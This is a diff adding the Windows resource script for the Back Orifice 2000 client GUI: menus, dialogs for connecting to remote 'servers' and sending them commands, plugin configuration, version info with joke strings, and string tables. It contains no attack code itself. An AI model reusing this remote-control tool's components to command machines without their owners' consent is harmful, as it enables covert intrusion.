@@ -1,0 +1,765 @@
+//Microsoft Developer Studio generated resource script.
+//
+#include "include\resource.h"
+
+#define APSTUDIO_READONLY_SYMBOLS
+/////////////////////////////////////////////////////////////////////////////
+//
+// Generated from the TEXTINCLUDE 2 resource.
+//
+#include "afxres.h"
+
+/////////////////////////////////////////////////////////////////////////////
+#undef APSTUDIO_READONLY_SYMBOLS
+
+/////////////////////////////////////////////////////////////////////////////
+// English (U.S.) resources
+
+#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_ENU)
+#ifdef _WIN32
+LANGUAGE LANG_ENGLISH, SUBLANG_ENGLISH_US
+#pragma code_page(1252)
+#endif //_WIN32
+
+#ifdef APSTUDIO_INVOKED
+/////////////////////////////////////////////////////////////////////////////
+//
+// TEXTINCLUDE
+//
+
+1 TEXTINCLUDE DISCARDABLE 
+BEGIN
+    "include\\resource.h\0"
+END
+
+2 TEXTINCLUDE DISCARDABLE 
+BEGIN
+    "#include ""afxres.h""\r\n"
+    "\0"
+END
+
+3 TEXTINCLUDE DISCARDABLE 
+BEGIN
+    "#define _AFX_NO_SPLITTER_RESOURCES\r\n"
+    "#define _AFX_NO_OLE_RESOURCES\r\n"
+    "#define _AFX_NO_TRACKER_RESOURCES\r\n"
+    "#define _AFX_NO_PROPERTY_RESOURCES\r\n"
+    "\r\n"
+    "#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_ENU)\r\n"
+    "#ifdef _WIN32\r\n"
+    "LANGUAGE 9, 1\r\n"
+    "#pragma code_page(1252)\r\n"
+    "#endif //_WIN32\r\n"
+    "#include ""res\\bo2kgui.rc2""  // non-Microsoft Visual C++ edited resources\r\n"
+    "#include ""afxres.rc""         // Standard components\r\n"
+    "#endif\r\n"
+    "\0"
+END
+
+#endif    // APSTUDIO_INVOKED
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// Icon
+//
+
+// Icon with lowest ID value placed first to ensure application icon
+// remains consistent on all systems.
+IDR_MAINFRAME           ICON    DISCARDABLE     "res\\bo2kgui.ico"
+IDR_BOWKSPTYPE          ICON    DISCARDABLE     "res\\BOWDoc.ico"
+IDI_BOCOMPUTER          ICON    DISCARDABLE     "res\\bocomput.ico"
+IDI_DELETEMACHINE       ICON    DISCARDABLE     "res\\icon1.ico"
+IDI_NEWMACHINE          ICON    DISCARDABLE     "res\\newmachi.ico"
+IDI_EDITMACHINE         ICON    DISCARDABLE     "res\\editmach.ico"
+IDI_SVRLIST             ICON    DISCARDABLE     "res\\ico00001.ico"
+IDI_VECTORBALL          ICON    DISCARDABLE     "res\\ico00002.ico"
+IDI_CONNECTICON         ICON    DISCARDABLE     "res\\ico00003.ico"
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// Menu
+//
+
+IDR_MAINFRAME MENU PRELOAD DISCARDABLE 
+BEGIN
+    POPUP "&File"
+    BEGIN
+        MENUITEM "&New Server",                 ID_SERVER_NEW
+        MENUITEM "&Edit Server",                ID_SERVER_EDIT
+        MENUITEM "&Delete Server(s)",           ID_SERVER_DELETE
+        MENUITEM SEPARATOR
+        MENUITEM "&New &Workspace\tCtrl+N",     ID_FILE_NEW
+        MENUITEM "&Open Workspace...\tCtrl+O",  ID_FILE_OPEN
+        MENUITEM "&Save Workspace\tCtrl+S",     ID_FILE_SAVE
+        MENUITEM "Save Workspace &As...",       ID_FILE_SAVE_AS
+        MENUITEM SEPARATOR
+        MENUITEM "Recent File",                 ID_FILE_MRU_FILE1, GRAYED
+        MENUITEM SEPARATOR
+        MENUITEM "E&xit",                       ID_APP_EXIT
+    END
+    POPUP "&Edit"
+    BEGIN
+        MENUITEM "&Undo\tCtrl+Z",               ID_EDIT_UNDO, GRAYED
+        MENUITEM SEPARATOR
+        MENUITEM "Cu&t\tCtrl+X",                ID_EDIT_CUT, GRAYED
+        MENUITEM "&Copy\tCtrl+C",               ID_EDIT_COPY, GRAYED
+        MENUITEM "&Paste\tCtrl+V",              ID_EDIT_PASTE, GRAYED
+    END
+    POPUP "&View"
+    BEGIN
+        MENUITEM "&Color Gradients",            IDM_GRADIENTS
+        MENUITEM "&Status Bar",                 ID_VIEW_STATUS_BAR
+        MENUITEM "Server &List",                IDM_SERVERLIST
+        MENUITEM "Screen &Reader Menus",        IDM_MENUTYPE
+    END
+    POPUP "&Plugins"
+    BEGIN
+        MENUITEM "&Configure...",               IDM_PLUGINS
+        MENUITEM SEPARATOR
+    END
+    POPUP "&Help"
+    BEGIN
+        MENUITEM "&About Back Orifice 2000...", ID_APP_ABOUT
+    END
+END
+
+IDR_SERVERMENU MENU DISCARDABLE 
+BEGIN
+    POPUP "Server Menu"
+    BEGIN
+        MENUITEM "Ping Server",                 IDP_PINGSERVER
+        MENUITEM "Requery Server",              IDP_REQUERYSERVER
+        MENUITEM SEPARATOR
+        MENUITEM "Delete Server",               IDP_DELETESERVER
+    END
+END
+
+IDR_SERVERLISTMENU MENU DISCARDABLE 
+BEGIN
+    POPUP "Server List Menu"
+    BEGIN
+        MENUITEM "Add Server...",               IDP_ADDSERVER
+    END
+END
+
+IDR_BKGNDPOPUP MENU DISCARDABLE 
+BEGIN
+    POPUP "Background Popup"
+    BEGIN
+        MENUITEM "Solid Color...",              IDM_SOLIDCOLOR
+        MENUITEM "Wallpaper Bitmap...",         IDM_BITMAP
+        MENUITEM "Tile Bitmap",                 IDM_TILE
+    END
+END
+
+IDR_GRADIENTMENU MENU DISCARDABLE 
+BEGIN
+    POPUP "Gradient Menu"
+    BEGIN
+        MENUITEM "Windows Colors 0",            IDM_COLOR_0
+        MENUITEM "Windows Colors 1",            IDM_COLOR_1
+        MENUITEM "Windows Colors 2",            IDM_COLOR_2
+        MENUITEM "Windows Colors 3",            IDM_COLOR_3
+        MENUITEM SEPARATOR
+        MENUITEM "Red",                         IDM_COLOR_RED
+        MENUITEM "Orange",                      IDM_COLOR_ORANGE
+        MENUITEM "Yellow",                      IDM_COLOR_YELLOW
+        MENUITEM "Green",                       IDM_COLOR_GREEN
+        MENUITEM "Blue",                        IDM_COLOR_BLUE
+        MENUITEM "Violet",                      IDM_COLOR_VIOLET
+        MENUITEM "Brown",                       IDM_COLOR_BROWN
+    END
+END
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// Accelerator
+//
+
+IDR_MAINFRAME ACCELERATORS PRELOAD MOVEABLE PURE 
+BEGIN
+    "C",            ID_EDIT_COPY,           VIRTKEY, CONTROL, NOINVERT
+    "N",            ID_FILE_NEW,            VIRTKEY, CONTROL, NOINVERT
+    "O",            ID_FILE_OPEN,           VIRTKEY, CONTROL, NOINVERT
+    "S",            ID_FILE_SAVE,           VIRTKEY, CONTROL, NOINVERT
+    "V",            ID_EDIT_PASTE,          VIRTKEY, CONTROL, NOINVERT
+    VK_BACK,        ID_EDIT_UNDO,           VIRTKEY, ALT, NOINVERT
+    VK_DELETE,      ID_EDIT_CUT,            VIRTKEY, SHIFT, NOINVERT
+    VK_F6,          ID_NEXT_PANE,           VIRTKEY, NOINVERT
+    VK_F6,          ID_PREV_PANE,           VIRTKEY, SHIFT, NOINVERT
+    VK_INSERT,      ID_EDIT_COPY,           VIRTKEY, CONTROL, NOINVERT
+    VK_INSERT,      ID_EDIT_PASTE,          VIRTKEY, SHIFT, NOINVERT
+    "X",            ID_EDIT_CUT,            VIRTKEY, CONTROL, NOINVERT
+    "Z",            ID_EDIT_UNDO,           VIRTKEY, CONTROL, NOINVERT
+END
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// Dialog
+//
+
+IDD_NEWMACHINEDLG DIALOG DISCARDABLE  0, 0, 268, 201
+STYLE DS_MODALFRAME | WS_POPUP | WS_CAPTION | WS_SYSMENU
+CAPTION "Edit Server Settings"
+FONT 8, "MS Sans Serif"
+BEGIN
+    EDITTEXT        IDC_MACHINENAME,92,54,170,14,ES_AUTOHSCROLL
+    EDITTEXT        IDC_SERVER_ADDRESS,92,82,170,14,ES_AUTOHSCROLL
+    COMBOBOX        IDC_CONNECTION_TYPE,92,110,170,45,CBS_DROPDOWNLIST | 
+                    WS_VSCROLL | WS_TABSTOP
+    COMBOBOX        IDC_ENCRYPTION_ENGINE,92,134,170,40,CBS_DROPDOWNLIST | 
+                    WS_VSCROLL | WS_TABSTOP
+    COMBOBOX        IDC_AUTH_HANDLER,92,158,170,40,CBS_DROPDOWNLIST | 
+                    WS_VSCROLL | WS_TABSTOP
+    DEFPUSHBUTTON   "OK",IDOK,212,180,50,16
+    PUSHBUTTON      "Cancel",IDCANCEL,92,180,50,16
+    ICON            IDI_BOCOMPUTER,IDC_STATIC,237,9,20,20,SS_REALSIZEIMAGE
+    LTEXT           "Edit these Back Orifice server properties to modify the server list. Choose appropriate connection type, encryption and authentication.",
+                    IDC_STATIC,92,4,135,33
+    LTEXT           "Connection Type:",IDC_STATIC,92,100,57,8
+    LTEXT           "Server Address:",IDC_STATIC,92,71,51,8
+    LTEXT           "Default Encryption:",IDC_STATIC,92,124,61,8
+    LTEXT           "Name of this server:",IDC_STATIC,92,44,64,8
+    CONTROL         155,IDC_STATIC,"Static",SS_BITMAP | SS_CENTERIMAGE | 
+                    WS_BORDER,5,5,75,191
+    LTEXT           "Authentication:",IDC_STATIC,92,148,48,8
+END
+
+IDD_ABOUTBOX DIALOG DISCARDABLE  0, 0, 235, 162
+STYLE DS_MODALFRAME | WS_POPUP | WS_CAPTION | WS_SYSMENU
+CAPTION "About Back Orifice 2000"
+FONT 8, "MS Sans Serif"
+BEGIN
+    ICON            IDR_MAINFRAME,IDC_STATIC,7,12,20,20
+    LTEXT           "Back Orifice 2000 (BO2K)\nVersion 1.0",IDC_STATIC,40,10,
+                    119,17,SS_NOPREFIX
+    LTEXT           "Copyright (C) 1999, Cult of the Dead Cow\nSpecial thanks to L0pht Heavy Industries, Inc.",
+                    IDC_STATIC,39,30,162,19
+    DEFPUSHBUTTON   "OK",IDOK,178,7,50,14,WS_GROUP
+    LTEXT           "http://www.cultdeadcow.com",IDC_CDC_URL,132,147,96,8
+    LTEXT           "Compiled on __TIMESTAMP__",IDC_COMPILETIME,39,50,184,8
+    LTEXT           "Portions of this code (the CJ60Lib toolkit, used for enhanced GUI elements) are Copyright (C) 1999, Kirk Stowell. Visit www.codejockeys.com/~kstowell and www.codeguru.com!",
+                    IDC_STATIC,39,65,189,26
+    LTEXT           "Back Orifice 2000 comes with ABSOLUTELY NO WARRANTY; for details view the GNU Public license 'gpl.txt' that accompanies this program.",
+                    IDC_STATIC,39,95,189,26
+    LTEXT           "This is free software, and you are welcome to redistribute it under certain conditions as stated in the license 'gpl.txt' file.",
+                    IDC_STATIC,40,125,188,18
+END
+
+IDD_SERVERLIST DIALOGEX 0, 0, 304, 69
+STYLE WS_CHILD | WS_VISIBLE
+EXSTYLE WS_EX_STATICEDGE
+FONT 8, "MS Sans Serif", 0, 0, 0x1
+BEGIN
+    CONTROL         "List1",ID_SERVERLIST,"SysListView32",LVS_REPORT | 
+                    LVS_SHOWSELALWAYS | LVS_SHAREIMAGELISTS | 
+                    LVS_AUTOARRANGE | LVS_ALIGNLEFT | LVS_NOSORTHEADER | 
+                    WS_BORDER | WS_TABSTOP,24,18,280,51
+    CONTROL         "Show Details",ID_DETAILS,"Button",BS_AUTOCHECKBOX | 
+                    WS_TABSTOP,44,4,57,10
+    PUSHBUTTON      "Add new server",ID_NEWMACHINE,4,17,16,14,BS_ICON | 
+                    BS_LEFT | BS_TOP
+    PUSHBUTTON      "Remove server",ID_DELETEMACHINE,4,33,16,14,BS_ICON | 
+                    BS_LEFT | BS_TOP
+    CONTROL         "Allow Docking",IDC_DOCKING,"Button",BS_AUTOCHECKBOX | 
+                    WS_TABSTOP,104,4,61,10
+    PUSHBUTTON      "Edit server properties",ID_EDITMACHINE,4,49,16,14,
+                    BS_ICON | BS_LEFT | BS_TOP
+    CONTROL         "Server List",IDC_STATIC,"Static",SS_LEFTNOWORDWRAP | 
+                    WS_GROUP,4,4,34,8
+END
+
+IDD_BOSERVERDLG DIALOGEX 0, 0, 292, 231
+STYLE WS_CHILD | WS_VISIBLE
+EXSTYLE WS_EX_STATICEDGE
+FONT 8, "MS Sans Serif", 0, 0, 0x1
+BEGIN
+    CONTROL         "Click To Connect",IDC_CONNECTCHECK,"Button",
+                    BS_AUTOCHECKBOX | BS_PUSHLIKE | WS_TABSTOP,145,30,65,15
+    CONTROL         "Tree2",IDC_SERVERCOMMANDS,"SysTreeView32",
+                    TVS_HASBUTTONS | TVS_HASLINES | TVS_LINESATROOT | 
+                    TVS_DISABLEDRAGDROP | TVS_SHOWSELALWAYS | WS_BORDER | 
+                    WS_TABSTOP,5,10,135,135
+    EDITTEXT        IDC_OPT1,149,73,60,14,ES_AUTOHSCROLL | ES_NUMBER
+    COMBOBOX        IDC_OPT2,149,100,136,58,CBS_DROPDOWN | CBS_AUTOHSCROLL | 
+                    CBS_SORT | WS_VSCROLL | WS_TABSTOP
+    COMBOBOX        IDC_OPT3,149,128,136,53,CBS_DROPDOWN | CBS_AUTOHSCROLL | 
+                    CBS_SORT | WS_VSCROLL | WS_TABSTOP
+    DEFPUSHBUTTON   "Send Command",IDC_SENDCOMMAND,217,72,68,14,WS_DISABLED
+    PUSHBUTTON      "Clear Responses",IDC_CLEARRESPONSES,215,148,70,15
+    EDITTEXT        IDC_SERVERRESPONSE,7,169,278,55,ES_MULTILINE | 
+                    ES_AUTOVSCROLL | ES_AUTOHSCROLL | ES_READONLY | 
+                    WS_VSCROLL
+    CONTROL         "Allow Docking",IDC_DOCKING,"Button",BS_AUTOCHECKBOX | 
+                    WS_TABSTOP,215,30,59,10
+    CONTROL         "Auto-Query",IDC_QUERYONCONNECT,"Button",BS_AUTOCHECKBOX | 
+                    WS_TABSTOP,215,40,70,10
+    EDITTEXT        IDC_MACHINEINFO,145,5,113,20,ES_MULTILINE | 
+                    ES_AUTOHSCROLL | ES_READONLY | NOT WS_BORDER,
+                    WS_EX_STATICEDGE
+    LTEXT           "Server Commands:",IDC_STATIC_SERVERCOMMANDS,7,2,60,8
+    LTEXT           "Static",IDC_STATIC_OPT3,144,118,125,10,NOT WS_VISIBLE
+    LTEXT           "Static",IDC_STATIC_OPT2,144,90,125,10,NOT WS_VISIBLE
+    LTEXT           "Static",IDC_STATIC_OPT1,144,61,125,8,NOT WS_VISIBLE
+    LTEXT           "Server Response:",IDC_STATIC_SERVERRESPONSE,5,156,58,8
+    PUSHBUTTON      "Change Settings\nChange Settings",IDC_SETTINGS,260,4,24,
+                    21,BS_ICON | BS_LEFT | BS_TOP
+END
+
+IDD_QUERYDLG DIALOG DISCARDABLE  0, 0, 112, 50
+STYLE DS_MODALFRAME | DS_SETFOREGROUND | DS_3DLOOK | DS_CENTER | WS_POPUP | 
+    WS_VISIBLE | WS_CAPTION
+CAPTION "Querying Server"
+FONT 8, "MS Sans Serif"
+BEGIN
+    DEFPUSHBUTTON   "Cancel",IDCANCEL,30,30,50,14
+    CTEXT           "Retrieving server capabilities\nPlease wait...",
+                    IDC_STATIC,5,5,100,20,NOT WS_GROUP
+END
+
+IDD_PLUGINS DIALOG DISCARDABLE  0, 0, 316, 173
+STYLE DS_MODALFRAME | DS_SETFOREGROUND | DS_3DLOOK | DS_CENTER | WS_POPUP | 
+    WS_VISIBLE | WS_CAPTION | WS_SYSMENU
+CAPTION "Plugin Configuration"
+FONT 8, "MS Sans Serif"
+BEGIN
+    CONTROL         "List1",IDC_PLUGINS,"SysListView32",LVS_REPORT | 
+                    LVS_SINGLESEL | LVS_SHOWSELALWAYS | LVS_SHAREIMAGELISTS | 
+                    LVS_ALIGNLEFT | LVS_NOSORTHEADER | WS_BORDER | 
+                    WS_TABSTOP,4,12,308,56
+    PUSHBUTTON      "Done",IDOK,260,156,52,14
+    PUSHBUTTON      "Insert...",IDC_INSERT,204,72,52,14
+    PUSHBUTTON      "Remove",IDC_REMOVE,260,72,52,14
+    CONTROL         "Tree1",IDC_OPTIONVARIABLES,"SysTreeView32",
+                    TVS_HASBUTTONS | TVS_HASLINES | TVS_LINESATROOT | 
+                    TVS_SHOWSELALWAYS | TVS_FULLROWSELECT | WS_BORDER | 
+                    WS_TABSTOP,4,80,148,88
+    EDITTEXT        IDC_STR_CURRENTVALUE,156,92,156,14,ES_AUTOHSCROLL | 
+                    ES_READONLY | WS_DISABLED
+    EDITTEXT        IDC_STR_NEWVALUE,156,116,156,14,ES_AUTOHSCROLL | 
+                    WS_DISABLED
+    CONTROL         "Disabled",IDC_BOOL_DISABLED,"Button",BS_AUTORADIOBUTTON | 
+                    WS_DISABLED,160,148,43,12
+    CONTROL         "Enabled",IDC_BOOL_ENABLED,"Button",BS_AUTORADIOBUTTON | 
+                    WS_DISABLED,208,148,42,12
+    DEFPUSHBUTTON   "Set Value",IDC_SETVALUE,260,136,52,16,WS_DISABLED
+    LTEXT           "Plugins Loaded:",IDC_STATIC1,4,4,52,8
+    LTEXT           "Option Variables:",IDC_STATIC2,4,72,54,8
+    LTEXT           "Current Value:",IDC_STATIC_CURVAL,156,84,46,8,
+                    WS_DISABLED
+    GROUPBOX        "Switch Setting",IDC_BOOL_GROUP,156,136,100,28,
+                    WS_DISABLED
+    LTEXT           "New Value:",IDC_STATIC_NEWVAL,156,108,38,8,WS_DISABLED
+END
+
+IDD_INTERACTIVE_LISTEN DIALOG DISCARDABLE  0, 0, 180, 129
+STYLE DS_MODALFRAME | WS_POPUP | WS_CAPTION | WS_SYSMENU
+CAPTION "Start Listening Service"
+FONT 8, "MS Sans Serif"
+BEGIN
+    EDITTEXT        IDC_SERVER_ADDRESS,4,12,170,14,ES_AUTOHSCROLL
+    COMBOBOX        IDC_CONNECTION_TYPE,4,40,170,45,CBS_DROPDOWNLIST | 
+                    WS_VSCROLL | WS_TABSTOP
+    COMBOBOX        IDC_ENCRYPTION_ENGINE,4,64,170,40,CBS_DROPDOWNLIST | 
+                    WS_VSCROLL | WS_TABSTOP
+    COMBOBOX        IDC_AUTH_HANDLER,4,88,170,40,CBS_DROPDOWNLIST | 
+                    WS_VSCROLL | WS_TABSTOP
+    DEFPUSHBUTTON   "OK",IDOK,124,108,50,16
+    PUSHBUTTON      "Cancel",IDCANCEL,72,108,48,16
+    LTEXT           "Connection Type:",IDC_STATIC,4,32,57,8
+    LTEXT           "Binding String:",IDC_STATIC,4,4,46,8
+    LTEXT           "Default Encryption:",IDC_STATIC,4,56,61,8
+    LTEXT           "Authentication:",IDC_STATIC,4,80,48,8
+END
+
+IDD_INTERACTIVE_CONNECT DIALOG DISCARDABLE  0, 0, 180, 129
+STYLE DS_MODALFRAME | WS_POPUP | WS_CAPTION | WS_SYSMENU
+CAPTION "Connect To"
+FONT 8, "MS Sans Serif"
+BEGIN
+    EDITTEXT        IDC_SERVER_ADDRESS,4,12,170,14,ES_AUTOHSCROLL
+    COMBOBOX        IDC_CONNECTION_TYPE,4,40,170,45,CBS_DROPDOWNLIST | 
+                    WS_VSCROLL | WS_TABSTOP
+    COMBOBOX        IDC_ENCRYPTION_ENGINE,4,64,170,40,CBS_DROPDOWNLIST | 
+                    WS_VSCROLL | WS_TABSTOP
+    COMBOBOX        IDC_AUTH_HANDLER,4,88,170,40,CBS_DROPDOWNLIST | 
+                    WS_VSCROLL | WS_TABSTOP
+    DEFPUSHBUTTON   "OK",IDOK,68,108,52,16
+    PUSHBUTTON      "Cancel",IDCANCEL,124,108,48,16
+    LTEXT           "Connection Type:",IDC_STATIC,4,32,57,8
+    LTEXT           "Server Address:",IDC_STATIC,4,4,51,8
+    LTEXT           "Default Encryption:",IDC_STATIC,4,56,61,8
+    LTEXT           "Authentication:",IDC_STATIC,4,80,48,8
+    ICON            IDI_CONNECTICON,IDC_STATIC,4,104,20,20
+END
+
+IDD_SPLASH DIALOGEX 0, 0, 287, 211
+STYLE DS_SETFOREGROUND | DS_CENTER | WS_POPUP | WS_VISIBLE
+FONT 8, "MS Sans Serif"
+BEGIN
+    CONTROL         182,IDC_SPLASH,"Static",SS_BITMAP | SS_REALSIZEIMAGE,0,0,
+                    213,148,WS_EX_TRANSPARENT
+END
+
+
+#ifndef _MAC
+/////////////////////////////////////////////////////////////////////////////
+//
+// Version
+//
+
+VS_VERSION_INFO VERSIONINFO
+ FILEVERSION 1,0,0,1
+ PRODUCTVERSION 1,0,0,1
+ FILEFLAGSMASK 0x3fL
+#ifdef _DEBUG
+ FILEFLAGS 0x29L
+#else
+ FILEFLAGS 0x28L
+#endif
+ FILEOS 0x4L
+ FILETYPE 0x1L
+ FILESUBTYPE 0x0L
+BEGIN
+    BLOCK "StringFileInfo"
+    BEGIN
+        BLOCK "000004b0"
+        BEGIN
+            VALUE "Comments", "You smell really bad. Shave, lose weight, and get a real job.\0"
+            VALUE "CompanyName", "Cult of the Dead Cow\0"
+            VALUE "FileDescription", "Back Orifice 2000 Client\0"
+            VALUE "FileVersion", "1, 0, 0, 1\0"
+            VALUE "InternalName", "bo2kgui\0"
+            VALUE "LegalCopyright", "Copyright © 1999, Cult of the Dead Cow\0"
+            VALUE "LegalTrademarks", ":P\0"
+            VALUE "OriginalFilename", "bo2kgui.exe\0"
+            VALUE "PrivateBuild", "o===3\0"
+            VALUE "ProductName", "Back Orifice 2000\0"
+            VALUE "ProductVersion", "1, 0, 0, 1\0"
+            VALUE "SpecialBuild", ":)3-<\0"
+        END
+    END
+    BLOCK "VarFileInfo"
+    BEGIN
+        VALUE "Translation", 0x0, 1200
+    END
+END
+
+#endif    // !_MAC
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// DESIGNINFO
+//
+
+#ifdef APSTUDIO_INVOKED
+GUIDELINES DESIGNINFO DISCARDABLE 
+BEGIN
+    IDD_NEWMACHINEDLG, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 261
+        TOPMARGIN, 7
+        BOTTOMMARGIN, 194
+    END
+
+    IDD_ABOUTBOX, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 228
+        TOPMARGIN, 7
+        BOTTOMMARGIN, 155
+    END
+
+    IDD_SERVERLIST, DIALOG
+    BEGIN
+        TOPMARGIN, 1
+    END
+
+    IDD_BOSERVERDLG, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 285
+        BOTTOMMARGIN, 224
+    END
+
+    IDD_QUERYDLG, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 105
+        TOPMARGIN, 7
+        BOTTOMMARGIN, 43
+    END
+
+    IDD_PLUGINS, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 309
+        TOPMARGIN, 6
+        BOTTOMMARGIN, 166
+    END
+
+    IDD_INTERACTIVE_LISTEN, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 173
+        TOPMARGIN, 7
+        BOTTOMMARGIN, 122
+    END
+
+    IDD_INTERACTIVE_CONNECT, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 173
+        TOPMARGIN, 7
+        BOTTOMMARGIN, 122
+    END
+
+    IDD_SPLASH, DIALOG
+    BEGIN
+        LEFTMARGIN, 7
+        RIGHTMARGIN, 280
+        TOPMARGIN, 7
+        BOTTOMMARGIN, 204
+    END
+END
+#endif    // APSTUDIO_INVOKED
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// Bitmap
+//
+
+IDB_LITTLE_BOCOMPS      BITMAP  DISCARDABLE     "res\\lit_bocomp.bmp"
+IDB_NORMAL_BOCOMPS      BITMAP  DISCARDABLE     "res\\nrm_bocomp.bmp"
+IDB_CMDTREE_IMAGELIST   BITMAP  DISCARDABLE     "res\\treelist.bmp"
+IDB_BO2K                BITMAP  DISCARDABLE     "res\\bo2k.BMP"
+IDB_IMGLIST             BITMAP  DISCARDABLE     "res\\optimg.bmp"
+IDB_CDCBANNER1          BITMAP  DISCARDABLE     "res\\cdcbanner1.bmp"
+IDB_VECTORBALL          BITMAP  DISCARDABLE     "res\\vectorball.bmp"
+IDB_VECTORMASK          BITMAP  DISCARDABLE     "res\\vectormask.bmp"
+IDB_BTN_ARROW           BITMAP  DISCARDABLE     "res\\btn_arro.bmp"
+IDB_BTN_EXPLORER        BITMAP  DISCARDABLE     "res\\btn_explorer.bmp"
+IDB_BUTTON_IMAGES       BITMAP  DISCARDABLE     "res\\button_images.bmp"
+IDR_MAINFRAME           BITMAP  MOVEABLE PURE   "res\\Toolbar.bmp"
+IDB_SPLASH              BITMAP  DISCARDABLE     "res\\bo2kstartup.bmp"
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// Toolbar
+//
+
+IDR_MAINFRAME TOOLBAR DISCARDABLE  16, 16
+BEGIN
+    BUTTON      ID_SERVER_NEW
+    BUTTON      ID_SERVER_EDIT
+    BUTTON      ID_SERVER_DELETE
+    SEPARATOR
+    BUTTON      ID_FILE_NEW
+    BUTTON      ID_FILE_OPEN
+    BUTTON      ID_FILE_SAVE
+    BUTTON      ID_FILE_SAVE_AS
+    SEPARATOR
+    BUTTON      IDM_GRADIENTS
+    BUTTON      ID_VIEW_STATUS_BAR
+    BUTTON      IDM_SERVERLIST
+    BUTTON      IDM_MENUTYPE
+    SEPARATOR
+    BUTTON      IDM_PLUGINS
+    SEPARATOR
+    BUTTON      ID_APP_ABOUT
+END
+
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// Cursor
+//
+
+IDC_HSPLITBAR           CURSOR  DISCARDABLE     "res\\hsplitba.cur"
+IDC_VSPLITBAR           CURSOR  DISCARDABLE     "res\\vsplitba.cur"
+
+/////////////////////////////////////////////////////////////////////////////
+//
+// String Table
+//
+
+STRINGTABLE PRELOAD DISCARDABLE 
+BEGIN
+    IDR_MAINFRAME           "BO2K Workspace\n\nbowksp\nBO2K Workspaces (*.bow)\n.bow\nbo2k.bow\nBO2K Workspace"
+    IDD_SERVERLIST          "Show or hide the server list\nToggle Server List"
+END
+
+STRINGTABLE PRELOAD DISCARDABLE 
+BEGIN
+    AFX_IDS_APP_TITLE       "BO2K Client"
+    AFX_IDS_IDLEMESSAGE     "Ready"
+END
+
+STRINGTABLE DISCARDABLE 
+BEGIN
+    ID_INDICATOR_EXT        "EXT"
+    ID_INDICATOR_CAPS       "CAP"
+    ID_INDICATOR_NUM        "NUM"
+    ID_INDICATOR_SCRL       "SCRL"
+    ID_INDICATOR_OVR        "OVR"
+    ID_INDICATOR_REC        "REC"
+END
+
+STRINGTABLE DISCARDABLE 
+BEGIN
+    ID_FILE_NEW             "Create a new BO2K workspace\nNew Workspace"
+    ID_FILE_OPEN            "Open an existing BO2K Workspace \nOpen Workspace"
+    ID_FILE_CLOSE           "Close the active document\nClose"
+    ID_FILE_SAVE            "Save the active BO2K workspace\nSave Workspace"
+    ID_FILE_SAVE_AS         "Save the active BO2K workspace with a new name\nSave Workspace As"
+END
+
+STRINGTABLE DISCARDABLE 
+BEGIN
+    ID_APP_ABOUT            "Display program information, version number and copyright\nAbout"
+    ID_APP_EXIT             "Quit the application; prompts to save documents\nExit"
+END
+
+STRINGTABLE DISCARDABLE 
+BEGIN
+    ID_FILE_MRU_FILE1       "Open this document"
+    ID_FILE_MRU_FILE2       "Open this document"
+    ID_FILE_MRU_FILE3       "Open this document"
+    ID_FILE_MRU_FILE4       "Open this document"
+    ID_FILE_MRU_FILE5       "Open this document"
+    ID_FILE_MRU_FILE6       "Open this document"
+    ID_FILE_MRU_FILE7       "Open this document"
+    ID_FILE_MRU_FILE8       "Open this document"
+    ID_FILE_MRU_FILE9       "Open this document"
+    ID_FILE_MRU_FILE10      "Open this document"
+    ID_FILE_MRU_FILE11      "Open this document"
+    ID_FILE_MRU_FILE12      "Open this document"
+    ID_FILE_MRU_FILE13      "Open this document"
+    ID_FILE_MRU_FILE14      "Open this document"
+    ID_FILE_MRU_FILE15      "Open this document"
+    ID_FILE_MRU_FILE16      "Open this document"
+END
+
+STRINGTABLE DISCARDABLE 
+BEGIN
+    ID_NEXT_PANE            "Switch to the next window pane\nNext Pane"
+    ID_PREV_PANE            "Switch back to the previous window pane\nPrevious Pane"
+END
+
+STRINGTABLE DISCARDABLE 
+BEGIN
+    ID_WINDOW_SPLIT         "Split the active window into panes\nSplit"
+END
+
+STRINGTABLE DISCARDABLE 
+BEGIN
+    ID_EDIT_CLEAR           "Erase the selection\nErase"
+    ID_EDIT_CLEAR_ALL       "Erase everything\nErase All"
+    ID_EDIT_COPY            "Copy the selection and put it on the Clipboard\nCopy"
+    ID_EDIT_CUT             "Cut the selection and put it on the Clipboard\nCut"
+    ID_EDIT_FIND            "Find the specified text\nFind"
+    ID_EDIT_PASTE           "Insert Clipboard contents\nPaste"
+    ID_EDIT_REPEAT          "Repeat the last action\nRepeat"
+    ID_EDIT_REPLACE         "Replace specific text with different text\nReplace"
+    ID_EDIT_SELECT_ALL      "Select the entire document\nSelect All"
+    ID_EDIT_UNDO            "Undo the last action\nUndo"
+    ID_EDIT_REDO            "Redo the previously undone action\nRedo"
+END
+
+STRINGTABLE DISCARDABLE 
+BEGIN
+    ID_VIEW_STATUS_BAR      "Show or hide the status bar\nToggle StatusBar"
+END
+
+STRINGTABLE DISCARDABLE 
+BEGIN
+    AFX_IDS_SCSIZE          "Change the window size"
+    AFX_IDS_SCMOVE          "Change the window position"
+    AFX_IDS_SCMINIMIZE      "Reduce the window to an icon"
+    AFX_IDS_SCMAXIMIZE      "Enlarge the window to full size"
+    AFX_IDS_SCNEXTWINDOW    "Switch to the next document window"
+    AFX_IDS_SCPREVWINDOW    "Switch to the previous document window"
+    AFX_IDS_SCCLOSE         "Close the active window and prompts to save the documents"
+END
+
+STRINGTABLE DISCARDABLE 
+BEGIN
+    AFX_IDS_SCRESTORE       "Restore the window to normal size"
